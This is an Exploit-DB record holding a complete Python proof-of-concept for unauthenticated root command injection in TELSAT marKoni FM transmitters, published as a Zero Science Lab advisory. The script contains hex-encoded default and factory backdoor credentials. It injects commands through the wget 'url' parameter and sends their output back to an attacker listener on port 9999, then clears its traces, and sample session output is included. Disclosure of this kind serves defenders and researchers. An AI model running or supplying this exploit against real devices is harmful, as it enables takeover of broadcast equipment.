{"source": "https://www.exploit-db.com/exploits/51906", "vulnName": "TELSAT marKoni FM Transmitter 1.9.5 - Root Command Injection", "vulnEDBID": "51906", "vulnCVE": "N/A", "author": "LIQUIDWORM", "exploitType": "REMOTE", "platform": "HARDWARE", "datePublished": "2024-03-18", "vulnContent": "#!/usr/bin/env python\n#\n#\n# TELSAT marKoni FM Transmitter 1.9.5 Root Command Injection PoC Exploit\n#\n#\n# Vendor: TELSAT Srl\n# Product web page: https://www.markoni.it\n# Affected version: Markoni-D (Compact) FM Transmitters\n#                   Markoni-DH (Exciter+Amplifiers) FM Transmitters\n#                   Markoni-A (Analogue Modulator) FM Transmitters\n#                   Firmware: 1.9.5\n#                             1.9.3\n#                             1.5.9\n#                             1.4.6\n#                             1.3.9\n#\n# Summary: Professional FM transmitters.\n#\n# Desc: The marKoni FM transmitters are susceptible to unauthenticated\n# remote code execution with root privileges. An attacker can exploit\n# a command injection vulnerability by manipulating the Email settings'\n# WAN IP info service, which utilizes the 'wget' module. This allows\n# the attacker to gain unauthorized access to the system with administrative\n# privileges by exploiting the 'url' parameter in the HTTP GET request\n# to ekafcgi.fcgi.\n#\n# -------------------------------------------------------------------------\n# [lqwrm@metalgear ~]# python yp.tiolpxe 10.0.8.3:88 backdoor 10.0.8.69 whoami\n# Authentication successful for backdoor\n# Injecting command: whoami\n# Listening on port 9999\n# ('10.0.8.3', 47302) called back\n# Received: root\n# Housekeeping...\n# Zya and thanks for stopping by!\n#\n# [lqwrm@metalgear ~]# \n#\n# -------------------------------------------------------------------------\n#\n# Tested on: GNU/Linux 3.10.53 (armv7l)\n#            icorem6solox\n#            lighttpd/1.4.33\n#\n#\n# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic\n# Macedonian Information Security Research and Development Laboratory\n# Zero Science Lab - https://www.zeroscience.mk - @zeroscience\n#\n#\n# Advisory ID: ZSL-2024-5808\n# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2024-5808.php\n#\n#\n# 10.11.2023\n#\n\nfrom colorama import init, Fore\nimport re,os,sys,requests\nimport socket,threading\nfrom time import sleep\ninit()\n\ndef just_listen_to_me(lport, cstop):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.bind((\"0.0.0.0\", lport))\n    s.listen(1)\n    print(\"Listening on port \" + str(lport))\n    try:\n        conn, addr = s.accept()\n        print(addr, \"called back\")\n        cstop.set()\n    except socket.timeout:\n        print(\"Call return timeout\\nCheck your ports\")\n        conn.close()\n    while True:\n        try:\n            odg = conn.recv(1771).decode()\n            uam = re.search(r\"User-Agent:\\s*(.*)\", odg)\n\n            if uam:\n                uav = uam.group(1)\n                print(f\"Received: {uav}\")\n                exit()\n            else:\n                print(\"No output for you\")\n        except:\n            print(\"Housekeeping...\")\n            exit()\n    s.close()\n\ndef authenticate(ipaddr, option): #### Encrypted Shit ####_\"\n    auth_url = f\"http://{ipaddr}\" # oOoOoOoOoOoOoOoOoOoOoOo\"\n    ep = \"/cgi-bin/ekafcgi.fcgi?OpCode=\" ##################\"\n    if option == \"user\": ##################################\"\n        username = \"\\x75\\x73\\x65\\x72\" #####################\"\n        password = \"\\x75\\x73\\x65\\x72\" #####################\"\n    elif option == \"admin\": ###############################\"\n        username = \"\\x61\\x64\\x6D\\x69\\x6E\" #################\"\n        password = \"\\x61\\x64\\x6D\\x69\\x6E\" #################\"\n    elif option == \"backdoor\": ############################\"\n        username = \"\\x66\\x61\\x63\\x74\\x6F\\x72\\x79\" #########\"\n        password = \"\\x69\\x6E\\x6F\\x6B\\x72\\x61\\x6D\\x32\\x35\"#_\"\n\n    authp = {\n        'username': username,\n        'password': password\n    }\n\n    resp = requests.get(auth_url + ep + \"1\", params=authp)\n\n    if \"Set-Cookie\" in resp.headers:\n        print(f\"Authentication successful for {option}\")\n        auth_cookie = resp.headers[\"Set-Cookie\"].split(\";\")[0]\n        return auth_cookie\n    else:\n        print(f\"Authentication failed for {option}.\")\n        print(\"Try a different option.\")\n        return None\n\ndef execute(ipaddr, cookie, command, listen_ip):\n    print(f\"Injecting command: {command}\")\n    ep = \"/cgi-bin/ekafcgi.fcgi?OpCode=\"\n    eden = f\"http://{ipaddr}{ep}26&param=wget&ena=1&url=-U%20%60{command}%60%20{listen_ip}:9999\"\n    dva = f\"http://{ipaddr}{ep}27\"\n    tri = f\"http://{ipaddr}{ep}26&param=wget&ena=0&url=\"\n    clear = f\"http://{ipaddr}{ep}3&com1=203C%20001001\"\n\n    headers = {\"Cookie\": cookie}\n\n    requests.get(eden, headers=headers)\n    sleep(2)\n    requests.get(dva, headers=headers)\n    sleep(2)\n    requests.get(tri, headers=headers)\n    sleep(1)\n    requests.get(clear, headers=headers)\n    print(\"Zya and thanks for stopping by!\")\n    exit(0)\n\ndef njaaah(text):\n    columns = os.get_terminal_size().columns\n    print(text.center(columns))\n\nzsl = \"\\033[91mWaddup!\\033[0m\" #Win64\nmrjox = f\"\"\"\n     ________\n   /          \\\\\n  /    ____    \\\\\n |   /    0 \\\\   |\n |   \\\\______/   | \n  \\\\____________/  {zsl}\n       | |\n      /   \\\\\n     /  O  \\\\\n    |    O  \\\\\n    |       \\\\\n    |        \\\\\n    |_________|\n        \"\"\"\n\nif len(sys.argv) != 5:\n    print()\n    print(\"This is a PoC script for the marKoni transmitters 0day\")\n    print(\"Usage: python yp.tiolpxe <target_ip:port> <option> <listen_ip> <command>\")\n    print(\"Option: 'user', 'admin', 'backdoor'\")\n    print(\"Default listening port: 9999\")\n    njaaah(mrjox)\n    exit()\n\nipaddr = sys.argv[1]\nopt = sys.argv[2]\nlisten_ip = sys.argv[3]\ncommand = sys.argv[4]\n\nopt_map = {\n    \"admin\"    : \"admin\",\n    \"user\"     : \"user\",\n    \"backdoor\" : \"backdoor\"\n}\n\nif opt in opt_map:\n    auth_cookie = authenticate(ipaddr, opt_map[opt])\n    if auth_cookie:\n        cstop = threading.Event()\n        lt = threading.Thread(target=just_listen_to_me, args=(9999, cstop))\n        lt.start()\n        execute(ipaddr, auth_cookie, command, listen_ip)\n        cstop.set()\n        lt.join()\nelse:\n    print(\"Invalid option.\")\n            "}